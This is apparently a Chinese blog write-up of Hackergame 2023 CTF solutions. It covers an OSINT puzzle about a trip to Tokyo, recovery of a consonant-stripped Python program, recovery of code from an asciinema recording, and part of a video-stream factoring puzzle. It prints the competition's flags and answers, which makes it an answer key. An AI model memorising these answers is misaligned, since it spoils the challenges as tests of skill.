<p>离开校园后，你和学长走到了附近的一家拉面馆用餐。那家店里的拉面香气扑鼻，店内的装饰和氛围也充满了日式的风格。学长（下图左一）与你分享了不少学校的趣事。饭后，你们决定在附近散步，享受这难得的闲暇时光。当你们走到一座博物馆前时，马路对面的喷泉和它周围的景色引起了你的注意。下午，白色的帐篷里即将举办一场大型活动，人们忙碌的身影穿梭其中，充满了期待与热情。</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/02.jpg" alt="拉面馆用餐"></p>
<p><img src="/2023/11/05/CTF_2023Hackergame/03.jpg" alt="喷泉旁边的帐篷"></p>
<p><strong>🌻 下午和夜晚</strong></p>
<p>在参观完博物馆后，学长陪你走到了上野站。你们都感到有些不舍，但知道每次的分别也是为了下次更好的相聚。学长那天晚上将继续他的学术之旅，打算乘船欣赏东京的迷人夜景和闪耀的彩虹大桥（Rainbow Bridge）。而你则搭乘了开往马里奥世界的电车，在那里度过了一段欢乐的时光。</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/04.jpg" alt="马里奥"></p>
</blockquote>
<h3 id="题目-1-2-神秘奖牌"><a href="#题目-1-2-神秘奖牌" class="headerlink" title="题目 1-2 神秘奖牌"></a>题目 1-2 神秘奖牌</h3><blockquote>
<p>1、你还记得与学长见面这天是哪一天吗？（格式：yyyy-mm-dd）</p>
<p>2、在学校该展厅展示的所有同种金色奖牌的得主中，出生最晚者获奖时所在的研究所缩写是什么？ </p>
</blockquote>
<p>今年暑假，日本</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231029065131179.png"></p>
<p><a target="_blank" rel="noopener" href="https://statphys28.org/">STATPHYS28</a> </p>
<p><img src="/2023/11/05/CTF_2023Hackergame/header.png"></p>
<p>学长那天晚上将继续他的学术之旅，应该就这其中的一天，很可能是倒数第二天</p>
<p><strong>2023-08-10</strong></p>
<p>看起来这是物理学和化学奖的奖章</p>
<p>M. KOSHIBA 小柴昌俊 是中微子天文学的开创者之一，2002年他因“对天体物理学的开拓性贡献，特别是宇宙中微子探测方面”获得诺贝尔物理学奖。</p>
<p>那就是 东京大学</p>
<p><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/zh-sg/%E6%97%A5%E6%9C%AC%E4%BA%BA%E8%AB%BE%E8%B2%9D%E7%88%BE%E7%8D%8E%E5%BE%97%E4%B8%BB">日本人诺贝尔奖得主</a></p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231029065703096.png"></p>
<p><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/zh-sg/%E6%A2%B6%E7%94%B0%E9%9A%86%E7%AB%A0">梶田隆章</a></p>
<p>东京大学宇宙射线研究所，<a target="_blank" rel="noopener" href="https://www.icrr.u-tokyo.ac.jp/">https://www.icrr.u-tokyo.ac.jp/</a> </p>
<p>The Institute for Cosmic Ray Research (ICRR)</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231029065719945.png"></p>
<p><strong>ICRR</strong></p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231029065514915.png"></p>
<h3 id="题目-3-4-这是什么活动？"><a href="#题目-3-4-这是什么活动？" class="headerlink" title="题目 3-4 这是什么活动？"></a>题目 3-4 这是什么活动？</h3><blockquote>
<p>3、帐篷中活动招募志愿者时用于的在线问卷的编号（以字母 S 开头后接数字）是多少？</p>
<p>4、学长购买自己的博物馆门票时，花费了多少日元？</p>
</blockquote>
<p>28th International Conference on Statistical Physics, Statphys28</p>
<p>日本东京都文京区本乡 5 Chome−23−11 らーめん 一信</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231029070329872.png"></p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231029070846956.png"></p>
<p><a target="_blank" rel="noopener" href="https://www.google.com/maps/@35.7093013,139.7603584,3a,77.5y,243.16h,95.42t/data=!3m7!1e1!3m5!1sj3OENOF4WAsKrHXENxxK5A!2e0!6shttps:%2F%2Fstreetviewpixels-pa.googleapis.com%2Fv1%2Fthumbnail%3Fpanoid%3Dj3OENOF4WAsKrHXENxxK5A%26cb_client%3Dmaps_sv.tactile.gps%26w%3D203%26h%3D100%26yaw%3D187.5142%26pitch%3D0%26thumbfov%3D100!7i16384!8i8192?entry=ttu">https://www.google.com/maps/@35.7093013,139.7603584,3a,77.5y,243.16h,95.42t/data=!3m7!1e1!3m5!1sj3OENOF4WAsKrHXENxxK5A!2e0!6shttps:%2F%2Fstreetviewpixels-pa.googleapis.com%2Fv1%2Fthumbnail%3Fpanoid%3Dj3OENOF4WAsKrHXENxxK5A%26cb_client%3Dmaps_sv.tactile.gps%26w%3D203%26h%3D100%26yaw%3D187.5142%26pitch%3D0%26thumbfov%3D100!7i16384!8i8192?entry=ttu</a></p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231029070653730.png"></p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231029071243129.png"></p>
<p><a target="_blank" rel="noopener" href="https://www.google.com/maps/@35.7172401,139.7750521,2a,75y,193.78h,96.67t/data=!3m9!1e1!3m7!1svDtWtjLzbEDvX8aWnFNaCQ!2e0!7i13312!8i6656!9m2!1b1!2i38?entry=ttu">https://www.google.com/maps/@35.7172401,139.7750521,2a,75y,193.78h,96.67t/data=!3m9!1e1!3m7!1svDtWtjLzbEDvX8aWnFNaCQ!2e0!7i13312!8i6656!9m2!1b1!2i38?entry=ttu</a></p>
<p>东京上野啤酒节？</p>
<p>谷歌 东京上野公园 ボランティア人 （志愿者），时间限定到8月</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231030191620639.png"></p>
<p><img src="/2023/11/05/CTF_2023Hackergame/cat_top_tokyo_title_bn.jpg"></p>
<p><a target="_blank" rel="noopener" href="https://umeshu-matsuri.jp/tokyo_staff/">ボランティアSTAFF大募集！！第６回「全国梅酒まつりin東京2023」</a></p>
<p><a target="_blank" rel="noopener" href="https://ws.formzu.net/dist/S495584522/">https://ws.formzu.net/dist/S495584522/</a></p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231030191841839.png"></p>
<p><strong>S495584522</strong></p>
<p><a target="_blank" rel="noopener" href="https://www.klook.com/zh-CN/activity/93708-ueno-de-beer-festa/">https://www.klook.com/zh-CN/activity/93708-ueno-de-beer-festa/</a></p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231029072733262.png"></p>
<p>东京国立博物馆</p>
<p><a target="_blank" rel="noopener" href="https://www.tnm.jp/modules/r_free_page/index.php?id=113#access_01">https://www.tnm.jp/modules/r_free_page/index.php?id=113#access_01</a></p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231029072811997.png"></p>
<p>中小学生、高中生或未满18周岁以及满70周岁以上者，均可免费参观综合文化展（常设展），入馆时请出示附有年龄的证件（学生证、医保卡、驾驶证等）</p>
<p><strong>0</strong> 日元</p>
<blockquote>
<p>这里其实开始试了 500 怎么也不对，试了 1000 也不对，最后输了个 0，过了</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">flag{PluM_w1NE_1S_rEa1LY_EXpen5iVE_3e2ca01289}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h3 id="题目-5-6-后会有期，学长！"><a href="#题目-5-6-后会有期，学长！" class="headerlink" title="题目 5-6 后会有期，学长！"></a>题目 5-6 后会有期，学长！</h3><blockquote>
<p>5、学长当天晚上需要在哪栋标志性建筑物的附近集合呢？（请用简体中文回答，四个汉字）                                  </p>
<p>6、进站时，你在 JR 上野站中央检票口外看到「ボタン＆カフリンクス」活动正在销售动物周边商品，该活动张贴的粉色背景海报上是什么动物（记作 A，两个汉字）？  在出站处附近建筑的屋顶广告牌上，每小时都会顽皮出现的那只 3D 动物是什么品种？（记作 B，三个汉字）？（格式：A-B）</p>
</blockquote>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231029070020155.png"></p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231030192730144.png"></p>
<p>当晚是有个 Banqiet 宴会 <a target="_blank" rel="noopener" href="https://statphys28.org/program/0810.html">https://statphys28.org/program/0810.html</a></p>
<p>gallery <a target="_blank" rel="noopener" href="https://statphys28.org/photogallery.html#06">https://statphys28.org/photogallery.html#06</a></p>
<p><a target="_blank" rel="noopener" href="https://statphys28.org/banquet.html">STATPHYS28 Banquet on “Yakatabune” Boat</a></p>
<p>船上宴会，真有意思</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231030193209423.png"></p>
<p>集合点在 Yasuda Auditorium，<del>安田礼堂</del> <strong>安田讲堂</strong></p>
<p><em>翻译错了搞了半天不对然后怀疑人生了，草</em></p>
<p><strong>第6问</strong></p>
<p>搜索 JR 上野 ボタン＆カフリンクス</p>
<p><a target="_blank" rel="noopener" href="https://plaza.rakuten.co.jp/ayumilife/diary/202308110000/">https://plaza.rakuten.co.jp/ayumilife/diary/202308110000/</a></p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231030193832261.png"></p>
<p><strong>熊猫</strong></p>
<p><del>开往马里奥世界的电车 是说 日本环球影城马里奥园区？</del></p>
<p>搜了下图片，应该在涩谷</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231030202243944.png"></p>
<p>广告牌</p>
<p><a target="_blank" rel="noopener" href="https://www.gotokyo.org/jp/new-and-now/new-and-trending/221121/topics.html">https://www.gotokyo.org/jp/new-and-now/new-and-trending/221121/topics.html</a></p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231031005825612.png"></p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231031005847286.png"></p>
<p>新宿有三花猫，涩谷有秋田犬，可爱捏！</p>
<p>so 这题就是 <strong>熊猫-秋田犬</strong></p>
<pre class="line-numbers language-none"><code class="language-none">flag{Un7I1_W3_M337_A64iN_6oODByE_S3n1OR_7f0fa2a99e}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>





<h2 id="惜字如金-2-0"><a href="#惜字如金-2-0" class="headerlink" title="惜字如金 2.0"></a>惜字如金 2.0</h2><blockquote>
<p>惜字如金一向是程序开发的优良传统。无论是「<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/8390979/why-create-system-call-is-called-creat">creat</a>」还是「<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/8226075/why-http-referer-is-single-r-not-http-referrer">referer</a>」，都无不闪耀着程序员「节约每句话中的每一个字母」的优秀品质。上一届信息安全大赛组委会在去年推出「惜字如金化」（XZRJification）标准规范后，受到了广大程序开发人员的好评。现将该标准辑录如下。</p>
<p><strong>惜字如金化标准</strong></p>
<p>惜字如金化指的是将一串文本中的部分字符删除，从而形成另一串文本的过程。该标准针对的是文本中所有由 52 个拉丁字母连续排布形成的序列，在下文中统称为「单词」。一个单词中除「<code>AEIOUaeiou</code>」外的 42 个字母被称作「辅音字母」。整个惜字如金化的过程按照以下两条原则对文本中的每个单词进行操作：</p>
<ul>
<li>第一原则（又称 creat 原则）：如单词最后一个字母为「<code>e</code>」或「<code>E</code>」，且该字母的上一个字母为辅音字母，则该字母予以删除。</li>
<li>第二原则（又称 referer 原则）：如单词中存在一串全部由完全相同（忽略大小写）的辅音字母组成的子串，则该子串仅保留第一个字母。</li>
</ul>
<p>容易证明惜字如金化操作是幂等的：惜字如金化多次和惜字如金化一次的结果相同。</p>
<p><strong>你的任务</strong></p>
<p>附件包括了一个用于打印本题目 flag 的程序，且已经经过惜字如金化处理。你需要做的就是得到程序的执行结果。</p>
<p><strong>附注</strong></p>
<p>本文已经过惜字如金化处理。解答本题不需要任何往届比赛的相关知识。</p>
<hr>
<p>XIZIRUJIN has always been a good tradition of programing. Whether it is “<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/8390979/why-create-system-call-is-called-creat">creat</a>“ or “<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/8226075/why-http-referer-is-single-r-not-http-referrer">referer</a>“, they al shin with th great virtu of a programer which saves every leter in every sentens. Th Hackergam 2022 Comitee launched th “XZRJification” standard last year, which has been highly aclaimed by a wid rang of  programers. Her w past th standard as folows.</p>
<p><strong>XZRJification Standard</strong></p>
<p>XZRJification refers to th proces of deleting som characters in a  text which forms another text. Th standard aims at al th continuous  sequences of 52 Latin leters named as “word”s in a text. Th 42 leters in a word except “<code>AEIOUaeiou</code>“ ar caled “consonant”s. Th XZRJification proces operates on each word in th text acording to th folowing two principles:</p>
<ul>
<li>Th first principl (also known as creat principl): If th last leter of th word is “<code>e</code>“ or “<code>E</code>“, and th previous leter of this leter is a consonant, th leter wil b deleted.</li>
<li>Th second principl (also known as referer principl): If ther is a  substring of th sam consonant (ignoring cas) in a word, only th first  leter of th substring wil b reserved.</li>
</ul>
<p>It is easy to prov that XZRJification is idempotent: th result of  procesing XZRJification multipl times is exactly th sam as that of only  onc.</p>
<p><strong>Your Task</strong></p>
<p>A program for printing th flag of this chaleng has been procesed  through XZRJification and packed into th atachment. Al you need to do is to retriev th program output.</p>
<p><strong>Notes</strong></p>
<p>This articl has been procesed through XZRJification. Any knowledg  related to previous competitions is not required to get th answer to  this chaleng.</p>
</blockquote>
<p>甚至比去年的还简单，根据 <code>flag</code> 对应的位置，人工推理一下就行了</p>
<p>恢复后的一种可能代码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3</span>

<span class="token comment"># The size of the file may reduce after XZRJification</span>

<span class="token keyword">def</span> <span class="token function">check_equals</span><span class="token punctuation">(</span>left<span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># check whether left == right or not</span>
    <span class="token keyword">if</span> left <span class="token operator">!=</span> right<span class="token punctuation">:</span> exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">get_code_dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># prepare the code dict</span>
    code_dict <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    code_dict <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token string">'nymeh1niwemflcir}echaete'</span><span class="token punctuation">]</span>
    code_dict <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token string">'a3g7}kidgojernoetllsup?h'</span><span class="token punctuation">]</span>
    code_dict <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token string">'ulw!ff5soadrhwnrsnstnoeq'</span><span class="token punctuation">]</span>
    code_dict <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token string">'ctt{l-findiehaai{oveatas'</span><span class="token punctuation">]</span>
    code_dict <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token string">'ty9kxborszstgguyd?!blm-p'</span><span class="token punctuation">]</span>
    check_equals<span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">for</span> s <span class="token keyword">in</span> code_dict<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token number">24</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>code_dict<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">decrypt_data</span><span class="token punctuation">(</span>input_codes<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># retrieve the decrypted data</span>
    code_dict <span class="token operator">=</span> get_code_dict<span class="token punctuation">(</span><span class="token punctuation">)</span>
    output_chars <span class="token operator">=</span> <span class="token punctuation">[</span>code_dict<span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> input_codes<span class="token punctuation">]</span>
    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>output_chars<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token comment"># check some obvious things</span>
    check_equals<span class="token punctuation">(</span><span class="token string">'create'</span><span class="token punctuation">,</span> <span class="token string">'cre'</span> <span class="token operator">+</span> <span class="token string">'ate'</span><span class="token punctuation">)</span>
    check_equals<span class="token punctuation">(</span><span class="token string">'referrer'</span><span class="token punctuation">,</span> <span class="token string">'refer'</span> <span class="token operator">+</span> <span class="token string">'rer'</span><span class="token punctuation">)</span>
    <span class="token comment"># check the flag</span>
    flag <span class="token operator">=</span> decrypt_data<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span>
                         <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span>
                         <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span>
                         <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    check_equals<span class="token punctuation">(</span>flag<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'flag{'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
    check_equals<span class="token punctuation">(</span>flag<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'}'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token comment"># print the flag</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231030211624369.png"></p>
<p><code>flag{you-ve-r3cover3d-7he-an5w3r-r1ght?}</code></p>
<p>感觉特地选了那些影响不大的位了（</p>
<h2 id="🪐-高频率星球"><a href="#🪐-高频率星球" class="headerlink" title="🪐 高频率星球"></a>🪐 高频率星球</h2><blockquote>
<blockquote>
<p>包含 AI 辅助创作</p>
</blockquote>
<p><img src="/2023/11/05/CTF_2023Hackergame/cover-1698600846610-1.jpeg" alt="cover.jpeg"></p>
<p>茫茫星系间，文明被分为不同的等级。每一个文明中都蕴藏了一种古老的力量 —— flag，被认为是其智慧的象征。</p>
<p>你在探索的过程中意外进入了一个封闭空间。这是一个由神秘的高频率星人控制着的星球。星球的中心竖立着一个巨大的三角形任务牌，上面刻着密文和挑战。</p>
<p>高频率星人的视觉输入频率极高，可以一目千行、过目不忘，他们的交流对地球人来说过于超前了。flag 被藏在了这段代码中，但是现在只有高频率星人在终端浏览代码的时候，使用 <a target="_blank" rel="noopener" href="https://asciinema.org/">asciinema</a> 录制的文件了，你能从中还原出代码吗？</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/asciinema_restore_play.gif"></p>
<p>上方动画仅供参考，请点击下面「打开/下载题目」按钮下载题目文件。</p>
</blockquote>
<p>先装个 <a target="_blank" rel="noopener" href="https://asciinema.org/">asciinema</a> ，参考<a target="_blank" rel="noopener" href="https://asciinema.org/docs/usage">使用文档</a>，播放一下，然后干脆直接导出输出到文件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> asciinema
asciinema play asciinema_restore.rec
asciinema <span class="token function">cat</span> asciinema_restore.rec <span class="token operator">&gt;</span> output.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>发现是 less 了个 <code>flag.js</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">stage % sha256sum flag.js
6bbbb91b7adc465fa086ec4ad453bca38beef9967800bf24d046a27b8cb70042  flag.js
stage % <span class="token function">less</span> flag.js
stage % <span class="token builtin class-name">echo</span> <span class="token string">"Execute flag.js with nodejs to get the flag"</span>
Execute flag.js with nodejs to get the flag
stage % <span class="token function">node</span> flag.js
stage %<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后把多余的控制字符给删了，比如下面这种</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231030020446847.png"></p>
<p>然后直接拿 NodeJS 执行好了</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">node</span> flag.js
flag<span class="token punctuation">{</span>y0u_cAn_ReSTorE_C0de_fr0m_asc11nema_3db2da106330xxxxxxxxxxxxxxxxxxxxxx<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<h2 id="🪐-流式星球"><a href="#🪐-流式星球" class="headerlink" title="🪐 流式星球"></a>🪐 流式星球</h2><blockquote>
<blockquote>
<p>包含 AI 辅助创作</p>
</blockquote>
<p><img src="/2023/11/05/CTF_2023Hackergame/cover-1699285009082-1.jpeg" alt="cover.jpeg"></p>
<p>茫茫星系间，文明被分为不同的等级。每一个文明中都蕴藏了一种古老的力量 —— flag，被认为是其智慧的象征。</p>
<p>你在探索的过程中意外进入了一个封闭空间。这是一个由神秘的流式星人控制着的星球。星球的中心竖立着一个巨大的三角形任务牌，上面刻着密文和挑战。</p>
<p>流式星人用流式数据交流，比如对于视频来说，他们不需要同时纵览整个画面，而是直接使用像素流。为了方便理解，你把这个过程写成了一个 Python 脚本（见附件），flag 就藏在这个视频（见附件）中。尽管最后丢掉了一部分数据，你能把 flag 还原出来吗？</p>
</blockquote>
<p>源码给的是读取 mp4 视频，随机去除拉平后的数组的最后的最多100个元素之后写入 bin 文件。</p>
<p>而视频的宽和高都不是10的倍数</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">assert</span> frame_width <span class="token operator">%</span> <span class="token number">10</span> <span class="token operator">!=</span> <span class="token number">0</span>
<span class="token keyword">assert</span> frame_height <span class="token operator">%</span> <span class="token number">10</span> <span class="token operator">!=</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/List_of_common_resolutions">wikipedia：List of common resolutions</a></p>
<p>把里面所有的都试了试，发现最后出来的帧数都不是整数</p>
<p>又想了想，这个最后 ravel 展平后的一维数组 buffer 的长度应该是且仅包含 3、frame_count、frame_height、frame_width 这四个因数</p>
<p>那就变成分解质因数的问题上了，直接写了个脚本去调用 <a target="_blank" rel="noopener" href="http://factordb.com/">http://factordb.com</a> 好了</p>
<p>总字节数 total_bytes 的范围在 [135146688, 135146787]，取其中被3整除的，然后除3，依次去分解质因数</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">
ss <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">135146688</span><span class="token punctuation">,</span> <span class="token number">135146691</span><span class="token punctuation">,</span> <span class="token number">135146694</span><span class="token punctuation">,</span> <span class="token number">135146697</span><span class="token punctuation">,</span> <span class="token number">135146700</span><span class="token punctuation">,</span> <span class="token number">135146703</span><span class="token punctuation">,</span> <span class="token number">135146706</span><span class="token punctuation">,</span> <span class="token number">135146709</span><span class="token punctuation">,</span> <span class="token number">135146712</span><span class="token punctuation">,</span> <span class="token number">135146715</span><span class="token punctuation">,</span> <span class="token number">135146718</span><span class="token punctuation">,</span> <span class="token number">135146721</span><span class="token punctuation">,</span> <span class="token number">135146724</span><span class="token punctuation">,</span> <span class="token number">135146727</span><span class="token punctuation">,</span> <span class="token number">135146730</span><span class="token punctuation">,</span> <span class="token number">135146733</span><span class="token punctuation">,</span> <span class="token number">135146736</span><span class="token punctuation">,</span>
      <span class="token number">135146739</span><span class="token punctuation">,</span> <span class="token number">135146742</span><span class="token punctuation">,</span> <span class="token number">135146745</span><span class="token punctuation">,</span> <span class="token number">135146748</span><span class="token punctuation">,</span> <span class="token number">135146751</span><span class="token punctuation">,</span> <span class="token number">135146754</span><span class="token punctuation">,</span> <span class="token number">135146757</span><span class="token punctuation">,</span> <span class="token number">135146760</span><span class="token punctuation">,</span> <span class="token number">135146763</span><span class="token punctuation">,</span> <span class="token number">135146766</span><span class="token punctuation">,</span> <span class="token number">135146769</span><span class="token punctuation">,</span> <span class="token number">135146772</span><span class="token punctuation">,</span> <span class="token number">135146775</span><span class="token punctuation">,</span> <span class="token number">135146778</span><span class="token punctuation">,</span> <span class="token number">135146781</span><span class="token punctuation">,</span> <span class="token number">135146784</span><span class="token punctuation">,</span> <span class="token number">135146787</span><span class="token punctuation">]</span>

<span class="token comment"># len(ss)</span>
<span class="token comment"># 34</span>

ll <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> ss<span class="token punctuation">:</span>
    ll<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token operator">//</span><span class="token number">3</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>ll<span class="token punctuation">)</span>
<span class="token comment"># [45048896, 45048897, 45048898, 45048899, 45048900, 45048901, 45048902, 45048903, 45048904, 45048905, 45048906, 45048907, 45048908, 45048909, 45048910, 45048911, 45048912, 45048913, 45048914, 45048915, 45048916, 45048917, 45048918, 45048919, 45048920, 45048921, 45048922, 45048923, 45048924, 45048925, 45048926, 45048927, 45048928, 45048929]</span>


<span class="token keyword">def</span> <span class="token function">get_factor</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">:</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0'</span><span class="token punctuation">,</span>
        <span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'</span><span class="token punctuation">,</span>
        <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span> <span class="token string">'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'</span><span class="token punctuation">,</span>
        <span class="token string">'DNT'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span>
        <span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'keep-alive'</span><span class="token punctuation">,</span>
        <span class="token string">'Referer'</span><span class="token punctuation">:</span> <span class="token string">'http://factordb.com/index.php'</span><span class="token punctuation">,</span>
        <span class="token string">'Upgrade-Insecure-Requests'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>
    <span class="token punctuation">}</span>

    params <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">'query'</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span>

    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://factordb.com/index.php'</span><span class="token punctuation">,</span>
                            params<span class="token operator">=</span>params<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
    r_text <span class="token operator">=</span> response<span class="token punctuation">.</span>text
    result <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>
        <span class="token string">r'&lt;/a&gt;&lt;/td&gt;\s&lt;td&gt;&lt;a href=\"index.php\?id=(\d+)\"&gt;.+ = (.+)&lt;/a&gt;&lt;/td&gt;'</span><span class="token punctuation">,</span> r_text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token comment"># print(result)</span>
